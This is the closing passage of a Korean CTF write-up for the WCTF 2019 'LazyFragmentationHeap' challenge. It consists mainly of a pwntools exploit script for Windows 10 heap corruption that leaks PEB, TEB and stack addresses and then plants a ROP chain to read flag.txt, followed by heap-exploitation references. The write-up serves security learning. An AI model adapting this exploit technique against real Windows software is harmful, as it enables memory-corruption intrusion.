                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">)</span>

        <span class="n">magic_switch</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">magic_switch</span>
        <span class="k">return</span> <span class="n">result</span>

    <span class="k">def</span> <span class="nf">lazy_write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">magic_switch</span>

        <span class="k">if</span> <span class="n">magic_switch</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header3</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header2</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
                           <span class="n">lazy_header3</span> <span class="o">+</span>
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
            <span class="p">)</span>

        <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id3</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
        <span class="n">magic_switch</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">magic_switch</span>

    <span class="c1"># ntdll!TlsBitMap+0x8 == _PEB-&gt;TlsBitmap
</span>    <span class="n">_PEB</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">ntdll</span><span class="o">+</span><span class="mh">0x165348</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x80</span> 
    <span class="n">_TEB</span> <span class="o">=</span> <span class="n">_PEB</span> <span class="o">+</span> <span class="mh">0x1000</span> 

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_PEB = 0x%016x"</span> <span class="o">%</span> <span class="n">_PEB</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_TEB = 0x%016x"</span> <span class="o">%</span> <span class="n">_TEB</span><span class="p">)</span>

    <span class="c1"># leak _TEB-&gt;NtTib-&gt;StackBase
</span>    <span class="n">stack_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">_TEB</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">2</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_TEB-&gt;NtTib-&gt;StackBase = 0x%016x"</span> <span class="o">%</span> <span class="n">stack_base</span><span class="p">)</span>
   
    <span class="c1"># find return address of main() at beginning
</span>    <span class="n">main_ret</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x1b78</span>

    <span class="n">find_ret_addr</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"finding return address on stack"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_base</span> <span class="o">-</span> <span class="n">offset</span>
        <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">lazy_read</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

        <span class="k">if</span> <span class="n">stack_leak</span> <span class="o">==</span> <span class="n">main_ret</span><span class="p">:</span>
            <span class="n">find_ret_addr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"gotcha!"</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="c1"># return addres of read() at lazyfragmentationheap+0x14bb
</span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x80</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack addr = 0x%016x"</span> <span class="o">%</span> <span class="n">stack_addr</span><span class="p">)</span>

    <span class="n">flag_addr</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x50c0</span>
    <span class="n">flag_buf</span> <span class="o">=</span> <span class="n">lazy_base</span> <span class="o">+</span> <span class="mh">0x50d0</span>
    <span class="n">lazy_write</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">,</span> <span class="s">"flag.txt</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

    <span class="c1"># restore Heap for WINAPI internal usage
</span>    <span class="n">HeapCreate_addr</span>   <span class="o">=</span> <span class="n">kernel32</span> <span class="o">+</span> <span class="mh">0x1e500</span> <span class="c1"># IAT to KERNELBASE!HeapCreate
</span>
    <span class="c1"># https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/crt-alphabetical-function-reference
</span>    <span class="c1"># ucrtbase.dll contains POSIX functions like open(), read(), write()...
</span>    <span class="n">open_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xa1ae0</span>
    <span class="n">read_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x16140</span>
    <span class="n">write_addr</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x14b30</span>
    <span class="n">exit_addr</span>  <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x1b8c0</span>

    <span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x21527</span>
    <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xa9eb2</span>
    <span class="n">pop_r8_ret</span>  <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x4d6cf</span>
    <span class="n">store_rdx_rax_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x88f5c</span>
    <span class="n">store_rcx_plus8_rax_ret</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0x4a721</span>
    <span class="n">add_rsp_0x28_ret</span> <span class="o">=</span> <span class="n">ntdll</span> <span class="o">+</span> <span class="mh">0x63c5</span>

    <span class="n">process_heap</span> <span class="o">=</span> <span class="n">_PEB</span> <span class="o">+</span> <span class="mh">0x30</span>    <span class="c1"># _PEB-&gt;ProcessHeap
</span>    <span class="n">crt_heap</span> <span class="o">=</span> <span class="n">ucrtbase</span> <span class="o">+</span> <span class="mh">0xeb570</span> <span class="c1"># ucrtbase!_acrt_heap
</span>
    <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">HeapCreate_addr</span><span class="p">,</span>   <span class="c1"># rax = HeapCreate(0, 0, 0)
</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">process_heap</span><span class="p">,</span>
        <span class="n">store_rdx_rax_ret</span><span class="p">,</span> <span class="c1"># *process_heap = rax
</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">crt_heap</span><span class="p">,</span>
        <span class="n">store_rdx_rax_ret</span><span class="p">,</span> <span class="c1"># *crt_heap = rax
</span>
        <span class="c1"># rax = open("flag.txt", _O_RDONLY, _S_IREAD)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="n">flag_addr</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x100</span><span class="p">,</span>
        <span class="n">open_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># read(rax, flag_buf, 0x80)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="n">stack_addr</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">29</span><span class="p">),</span>
        <span class="n">store_rcx_plus8_rax_ret</span><span class="p">,</span>
        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mh">0x12345678</span><span class="p">,</span> <span class="c1"># will replace to fd
</span>        <span class="n">pop_rdx_ret</span><span class="p">,</span> 
        <span class="n">flag_buf</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">read_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># write(1, flag_buf, 0x80)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">1</span><span class="p">,</span>
        <span class="n">pop_rdx_ret</span><span class="p">,</span>
        <span class="n">flag_buf</span><span class="p">,</span>
        <span class="n">pop_r8_ret</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">write_addr</span><span class="p">,</span>
        <span class="n">add_rsp_0x28_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>

        <span class="c1"># exit(0)
</span>        <span class="n">pop_rcx_ret</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">exit_addr</span>
    <span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

    <span class="n">lazy_write</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">,</span> <span class="n">rop_chain</span><span class="p">)</span>
    <span class="n">hi</span><span class="p">.</span><span class="n">interactive</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>


<span class="c1"># I DON'T WANT TO SEE FXXKING ERROR
</span><span class="n">is_leaked</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"This is gonna takes some time..."</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">lazy_base</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">leakLazy</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">kernel32</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3008</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e690</span>  <span class="c1"># KERNEL32!IsDebuggerPresentStub
</span>        <span class="n">ntdll</span>    <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3010</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x73810</span>  <span class="c1"># ntdll!RtlInitializeSListHead
</span>        <span class="n">ucrtbase</span> <span class="o">=</span> <span class="n">persistent_leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x30b0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x0f760</span>  <span class="c1"># ucrtbase!free
</span>        <span class="k">break</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">continue</span>

<span class="n">is_leaked</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Done :D"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LazyFragmentationHeap = 0x%016x"</span> <span class="o">%</span> <span class="n">lazy_base</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"kernel32 = 0x%016x"</span> <span class="o">%</span> <span class="n">kernel32</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll    = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ucrtbase = 0x%016x"</span> <span class="o">%</span> <span class="n">ucrtbase</span><span class="p">)</span>

<span class="n">exploit</span><span class="p">()</span>
</code></pre></div></div> <p><img src="/assets/images/lazyfragmentationheap-pic9.png" alt="flag result" /></p> <h1 id="5-후기">5. 후기</h1> <p><img src="/assets/images/lazyfragmentationheap-pic10.jpg" alt="burnout" /></p> <p>하얗게 불태워버렸습니다…</p> <h1 id="6-참고자료">6. 참고자료</h1> <p>Low-fragmentation Heap</p> <ul> <li>https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap</li> </ul> <p>Windows 8 Heap Internals</p> <ul> <li>http://illmatics.com/Windows%208%20Heap%20Internals.pdf</li> <li>http://illmatics.com/Windows%208%20Heap%20Internals%20(Slides).pdf</li> </ul> <p>Windows 10 Nt Heap Exploitation (English version)</p> <ul> <li>https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</li> </ul> <p>windbg와 Win32 API로 알아보는 Windows Heap 정보 분석</p> <ul> <li>https://www.sysnet.pe.kr/2/0/12068</li> </ul> <p>Low Fragmentation Heap (LFH) Exploitation - Windows 10 Userspace</p> <ul> <li>https://github.com/peleghd/Windows-10-Exploitation/blob/master/Low_Fragmentation_Heap_(LFH)_Exploitation_-_Windows_10_Userspace_by_Saar_Amar.pdf</li> </ul> <p>Understanding the Windows Allocator: A Redux</p> <ul> <li>https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux</li> </ul> <p>Heap Overflow Exploitation on Windows 10 Explained</p> <ul> <li>https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/</li> </ul> <p>Windows Debugging( Written in Chinese )</p> <ul> <li>https://github.com/thawk/wiki/wiki/windows_debug</li> </ul> <div class="blog-navigation"> <a class="prev" href="http://localhost:4000/blog/2020/01/11/BabyKernel-Dragon2019-writeup.html">&laquo; [Writeup] BabyKernel - Dragon CTF 2019</a> <a class="next" href="http://localhost:4000/blog/2020/04/05/2020-null2root-recruit.html">[마감] 2020 Null@Root 신입 그룹원 모집 &raquo;</a> </div> <div class="related"> </div> <section class="author"> <div class="toleft"> <img class="selfie" src="http://localhost:4000/assets/images/y0ny0ns0n.png" alt="y0ny0ns0n" alt="author selfie"> </div> <div class="toright"> <h4 class="name">y0ny0ns0n</h4> <p class="bio">memory corruption bug in brain</p> <div class="share"> <!-- Note: Only use three share links if your site width is set to large --> <!-- If site width is set to normal, you may choose any two share links --> <a class="twitter" href="https://twitter.com/intent/tweet?text=http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html - [Writeup] LazyFragmentationHeap - WCTF 2019 by @y0ny0ns0n"> <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg><span class="icon-twitter">Tweet</span> </a> <a class="facebook" href="javascript:void(0)" onclick="window.open('https://facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href), 'facebook-share-dialog', 'width=626,height=436'); return false;"> <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg><span class="icon-facebook-rect">Share</span> </a> <!-- <a class="google-plus" href="https://plus.google.com/share?url=http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" target="_blank"> <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg><span class="icon-google-plus">Share</span> </a> --> <!-- <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html&amp;title=[Writeup] LazyFragmentationHeap - WCTF 2019&amp;summary=&amp;source=http://localhost:4000" target="_blank"> <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg><span class="icon-linkedin">Share</span> </a> --> <!-- <a class="reddit" href="https://reddit.com/submit?url=http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html&amp;title=[Writeup] LazyFragmentationHeap - WCTF 2019" target="_blank"> <svg class="icon icon-reddit"><use xlink:href="#icon-reddit"></use></svg><span class="icon-reddit">Share</span> </a> --> </div> </div> </section> <section class="disqus"> <div id="disqus_thread"></div> <script type="text/javascript"> var disqus_config = function () { this.page.url = 'http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html'; this.page.identifier = '/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup'; }; var disqus_shortname = 'mydisqus'; var disqus_developer = 0; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a> </section> <footer class="footer-main"> NULL@ROOT © 2025 <a class="link" href="http://localhost:4000/feed.xml" target="_blank"><svg class="icon icon-rss"><use xlink:href="#icon-rss"></use></svg></a> <p class="extra"> <a class="link" href="https://github.com/sergiokopplin/indigo">Indigo theme</a> by <a class="link" href="https://github.com/sergiokopplin/indigo">Kopplin</a> </p> </footer> </div> </div> <svg display="none" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <defs> <symbol id="icon-rss" viewBox="0 0 1024 1024"> <title>rss</title> <path class="path1" d="M122.88 122.88v121.19c362.803 0 656.896 294.195 656.896 656.998h121.293c0-429.773-348.416-778.189-778.189-778.189zM122.88 365.414v121.293c228.813 0 414.362 185.498 414.362 414.413h121.242c0-295.834-239.821-535.706-535.603-535.706zM239.053 668.621c-64.205 0-116.224 52.122-116.224 116.275s52.019 116.224 116.224 116.224 116.173-52.019 116.173-116.224-51.968-116.275-116.173-116.275z"></path> </symbol> <symbol id="icon-facebook" viewBox="0 0 1024 1024"> <title>facebook</title> <path class="path1" d="M870.4 51.2h-716.8c-56.32 0-102.4 46.080-102.4 102.4v716.8c0 56.371 46.080 102.4 102.4 102.4h358.4v-358.4h-102.4v-126.72h102.4v-104.96c0-110.797 62.054-188.621 192.819-188.621l92.314 0.102v133.376h-61.286c-50.893 0-70.246 38.195-70.246 73.626v86.528h131.482l-29.082 126.669h-102.4v358.4h204.8c56.32 0 102.4-46.029 102.4-102.4v-716.8c0-56.32-46.080-102.4-102.4-102.4z"></path> </symbol> <symbol id="icon-twitter" viewBox="0 0 1024 1024"> <title>twitter</title> <path class="path1" d="M886.579 319.795c0.41 8.294 0.563 16.691 0.563 24.986 0 255.488-194.406 549.99-549.888 549.99-109.21 0-210.739-32-296.294-86.886 15.155 1.792 30.515 2.714 46.080 2.714 90.624 0 173.926-30.925 240.026-82.688-84.531-1.587-155.955-57.395-180.531-134.195 11.776 2.202 23.91 3.379 36.352 3.379 17.664 0 34.765-2.304 50.944-6.707-88.422-17.818-155.034-95.898-155.034-189.594 0-0.819 0-1.587 0-2.406 26.061 14.49 55.91 23.194 87.552 24.218-51.866-34.714-86.016-93.798-86.016-160.922 0-35.379 9.523-68.608 26.214-97.178 95.283 116.992 237.773 193.894 398.387 201.984-3.277-14.182-4.966-28.877-4.966-44.083 0-106.701 86.477-193.178 193.229-193.178 55.603 0 105.83 23.398 141.107 60.979 43.981-8.704 85.35-24.781 122.726-46.899-14.438 45.107-45.107 82.995-84.992 106.906 39.117-4.71 76.288-15.002 111.002-30.413-25.907 38.81-58.675 72.806-96.461 99.994z"></path> </symbol> <symbol id="icon-github" viewBox="0 0 1024 1024"> <title>github</title> <path class="path1" d="M674.816 579.021c-36.762 0-66.56 41.318-66.56 92.109 0 50.893 29.798 92.211 66.56 92.211s66.56-41.318 66.56-92.211c-0.051-50.79-29.798-92.109-66.56-92.109zM906.547 339.251c7.629-18.688 7.936-124.877-32.512-226.611 0 0-92.723 10.189-233.011 106.496-29.44-8.192-79.258-12.186-128.973-12.186-49.818 0-99.584 3.994-129.024 12.186-140.339-96.307-233.062-106.496-233.062-106.496-40.397 101.734-39.987 207.923-32.461 226.611-47.514 51.61-76.544 113.613-76.544 198.195 0 367.923 305.306 373.811 382.31 373.811 17.51 0 52.122 0.102 88.781 0.102 36.608 0 71.27-0.102 88.678-0.102 77.107 0 382.31-5.888 382.31-373.811 0-84.582-28.979-146.586-76.493-198.195zM513.434 866.048h-2.867c-193.075 0-343.501-22.989-343.501-210.688 0-45.005 15.872-86.682 53.606-121.293 62.822-57.702 169.216-27.187 289.894-27.187 0.512 0 1.024 0 1.485 0 0.512 0 0.922 0 1.382 0 120.678 0 227.123-30.515 289.997 27.187 37.632 34.611 53.504 76.288 53.504 121.293 0 187.699-150.374 210.688-343.501 210.688zM349.235 579.021c-36.762 0-66.56 41.318-66.56 92.109 0 50.893 29.798 92.211 66.56 92.211 36.813 0 66.611-41.318 66.611-92.211 0-50.79-29.798-92.109-66.611-92.109z"></path> </symbol> <symbol id="icon-gitlab" viewBox="0 0 500 500"> <title>gitlab</title> <path class="path1" d="M249.9,476.8L249.9,476.8l90.7-279.1H159.2L249.9,476.8L249.9,476.8zM32.1,197.7L32.1,197.7L4.5,282.5c-2.5,7.7,0.2,16.2,6.8,21l238.5,173.3L32.1,197.7L32.1,197.7zM32.1,197.7h127.1L104.6,29.6c-2.8-8.6-15-8.6-17.9,0L32.1,197.7L32.1,197.7zM467.6,197.7L467.6,197.7l27.6,84.8c2.5,7.7-0.2,16.2-6.8,21L249.9,476.8L467.6,197.7L467.6,197.7 zM467.6,197.7H340.5l54.6-168.1c2.8-8.6,15-8.6,17.9,0L467.6,197.7L467.6,197.7z" ></path> </symbol> <symbol id="icon-youtube" viewBox="0 0 1024 1024"> <title>youtube</title> <path class="path1" d="M512 117.76c-503.194 0-512 44.749-512 394.24s8.806 394.24 512 394.24 512-44.749 512-394.24-8.806-394.24-512-394.24zM676.096 529.101l-229.888 107.315c-20.122 9.318-36.608-1.126-36.608-23.347v-202.138c0-22.17 16.486-32.666 36.608-23.347l229.888 107.315c20.122 9.421 20.122 24.781 0 34.202z"></path> </symbol> <symbol id="icon-mail" viewBox="0 0 1024 1024"> <title>mail</title> <path class="path1" d="M80.589 270.643c24.986 13.414 371.098 199.373 384 206.285s29.594 10.189 46.387 10.189c16.794 0 33.485-3.277 46.387-10.189s359.014-192.87 384-206.285c25.037-13.466 48.691-65.843 2.765-65.843h-866.253c-45.926 0-22.272 52.378 2.714 65.843zM952.986 383.437c-28.416 14.797-378.214 197.069-395.622 206.182s-29.594 10.189-46.387 10.189-28.979-1.075-46.387-10.189-365.21-191.437-393.626-206.234c-19.968-10.445-19.763 1.792-19.763 11.213s0 373.402 0 373.402c0 21.504 28.979 51.2 51.2 51.2h819.2c22.221 0 51.2-29.696 51.2-51.2 0 0 0-363.93 0-373.35s0.205-21.658-19.814-11.213z"></path> </symbol> <symbol id="icon-spotify" viewBox="0 0 1024 1024"> <title>spotify</title> <path class="path1" d="M512 61.44c-248.883 0-450.56 201.626-450.56 450.56 0 248.781 201.677 450.56 450.56 450.56 248.934 0 450.509-201.728 450.509-450.56 0-248.883-201.523-450.56-450.509-450.56zM690.074 742.502c-8.858 0-15.053-3.379-21.555-7.322-60.877-36.915-136.294-56.269-218.010-56.269-41.677 0-86.682 4.966-133.632 14.592l-5.734 1.434c-5.939 1.434-12.032 3.021-16.691 3.021-18.995 0-33.843-14.746-33.843-33.587 0-19.098 10.752-32.614 28.774-35.994 56.115-12.8 108.954-19.046 161.382-19.046 94.976 0 179.866 22.016 252.467 65.485 12.442 7.27 20.275 15.667 20.275 34.202-0.051 18.483-15.002 33.485-33.434 33.485zM736.819 611.379c-10.598 0-17.562-4.045-23.706-7.629-109.722-65.075-273.050-86.682-407.603-50.842-2.253 0.666-4.301 1.28-6.144 1.894-5.069 1.587-9.779 3.174-16.435 3.174-22.118 0-40.090-18.074-40.090-40.346 0-21.453 11.213-36.454 31.437-42.189 51.866-14.234 100.557-23.654 170.65-23.654 113.254 0 223.078 28.416 309.146 79.923 15.667 8.96 22.784 21.197 22.784 39.475 0 22.221-17.971 40.192-40.038 40.192zM789.862 461.875c-9.984 0-16.128-2.406-25.344-7.373-74.394-44.646-190.464-71.219-310.733-71.219-62.669 0-119.603 6.912-169.267 20.326-1.69 0.41-3.277 0.87-5.018 1.382-5.274 1.587-11.878 3.482-18.688 3.482-26.419 0-47.053-20.89-47.053-47.565 0-23.194 13.005-40.909 34.816-47.36 59.955-17.715 128.973-26.675 205.107-26.675 137.114 0 267.571 30.464 357.939 83.507 16.998 9.677 25.344 24.32 25.344 44.646 0 26.266-20.685 46.848-47.104 46.848z"></path> </symbol> <symbol id="icon-lastfm" viewBox="0 0 315 315"> <title>lastfm</title> <path class="path1" d="M264.467 135.355c-2.688-0.92-5.289-1.773-7.787-2.594C236.855 126.26 230 123.449 230 112.41 c0-9.572 6.799-16.26 16.533-16.26c7.986 0 13.502 3.307 19.039 11.41c2.156 3.158 6.348 4.188 9.721 2.389l19.148-10.205 c1.762-0.938 3.076-2.541 3.652-4.453c0.576-1.91 0.367-3.973-0.582-5.729c-11.123-20.596-27.912-31.037-49.9-31.037 c-16.592 0-30.648 5.227-40.654 15.117c-9.918 9.803-15.16 23.453-15.16 39.471c0 33.607 21.297 47.508 58.063 60.156 c21.045 7.311 25.965 10.137 25.965 21.121c0 13.578-11.727 23.434-27.885 23.434c-0.486 0-0.98-0.008-1.48-0.025 c-17.377-0.607-22.725-9.088-30.789-28.297c-12.947-30.814-28.082-67.734-29.205-70.543c-0.012-0.031-0.025-0.064-0.037-0.096 c-16.416-39.535-49.057-62.209-89.555-62.209C43.457 56.654 0 101.9 0 157.518c0 55.598 43.457 100.828 96.873 100.828 c29.217 0 56.559-13.49 75.016-37.014c1.674-2.133 2.064-5.004 1.025-7.508l-11.541-27.781c-1.125-2.711-3.729-4.514-6.66-4.619 c-2.945-0.105-5.654 1.512-6.971 4.135c-9.977 19.9-29.469 32.262-50.869 32.262c-31.658 0-57.414-27.053-57.414-60.303 c0-33.26 25.756-60.32 57.414-60.32c23.029 0 44.1 14.273 52.432 35.516c0.023 0.055 0.045 0.111 0.068 0.166l28.574 67.982 l3.293 7.617c13.811 33.602 34.273 48.652 66.359 48.797h0.133c38.348 0 67.268-26.699 67.268-62.103 C315 159.674 295.66 145.965 264.467 135.355z"></path> </symbol> <symbol id="icon-instagram" viewBox="0 0 1024 1024"> <title>instagram</title> <path class="path1" d="M870.4 51.2h-716.8c-56.32 0-102.4 46.080-102.4 102.4v716.8c0 56.371 46.080 102.4 